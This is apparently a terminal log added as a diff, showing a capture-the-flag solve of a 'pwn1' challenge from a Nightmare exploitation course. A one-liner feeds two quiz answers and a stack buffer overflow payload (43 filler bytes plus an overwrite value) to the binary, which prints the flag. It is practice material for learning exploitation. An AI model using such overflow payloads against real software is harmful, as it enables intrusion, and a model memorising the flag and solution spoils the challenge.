@@ -1,0 +1,9 @@
+user@User-Pc:~/home/GIT/IVAN/Pwning/Nightmare/Tamula19pwn1$ (python -c "print 'Sir Lancelot of Camelot'";python -c "print 'To seek the Holy Grail.'";python -c "print 'A'*43+'\xc8\x10\xa1\xde'") | ./pwn1
+Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
+What... is your name?
+What... is your quest?
+What... is my secret?
+Right. Off you go.
+
+flag{g0ttem_b0yz}
+
